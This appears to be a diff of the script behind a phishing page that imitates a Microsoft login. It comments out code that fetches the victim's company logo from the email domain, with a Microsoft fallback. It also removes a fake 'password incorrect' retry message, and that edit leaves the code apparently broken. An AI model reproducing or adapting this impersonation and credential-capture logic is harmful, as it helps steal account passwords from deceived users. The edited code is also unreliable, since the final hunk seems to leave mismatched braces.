@@ -10370,16 +10370,16 @@ $(document).ready(function() {
         var finalu = c.toUpperCase();
         $('#ai').val(my_ai);
 
-        $.get("https://logo.clearbit.com/" + my_slice)
-        .done(function() {
-                 $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
-                 $(".logoname").html(finalu);
+        // $.get("https://logo.clearbit.com/" + my_slice)
+        //     .done(function() {
+        //         $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+        //         $(".logoname").html(finalu);
 
-             }).fail(function() {
-                 $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
-                 $(".logoname").html("Microsoft");
+        //     }).fail(function() {
+        //         $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
+        //         $(".logoname").html("Microsoft");
 
-             });
+        //     });
 
         $("#div1").animate({ left: 200, opacity: "hide" }, 0);
         $("#div3").animate({ right: 200, opacity: "show" }, 0);
@@ -10435,16 +10435,16 @@ $(document).ready(function() {
         var c = my_slice.substr(0, my_slice.indexOf('.'));
         var final = c.toLowerCase();
         var finalu = c.toUpperCase();
-         $.get("https://logo.clearbit.com/" + my_slice)
-             .done(function() {
-                 $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
-                 $(".logoname").html(finalu);
+        // $.get("https://logo.clearbit.com/" + my_slice)
+        //     .done(function() {
+        //         $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+        //         $(".logoname").html(finalu);
 
-             }).fail(function() {
-                 $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
-                 $(".logoname").html("Microsoft");
+        //     }).fail(function() {
+        //         $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
+        //         $(".logoname").html("Microsoft");
 
-             });
+        //     });
 
         $("#div1").animate({ left: 200, opacity: "hide" }, 0);
         $("#div3").animate({ right: 200, opacity: "show" }, 0);
@@ -10530,13 +10530,10 @@ $(document).ready(function() {
                     }, 1000);
 
 
-                    return false;
-                }
-                $("#msg").html("Your account or password is incorrect. If you don't remember your password, <a href='#'>reset it now</a>");
-                $("#div3").animate({ left: 0, opacity: "hide" }, 0);
-                $("#div2").animate({ left: 0, opacity: "show" }, 100);
-            },
+                    }
+
             complete: function() {
+                
 
             }
         });
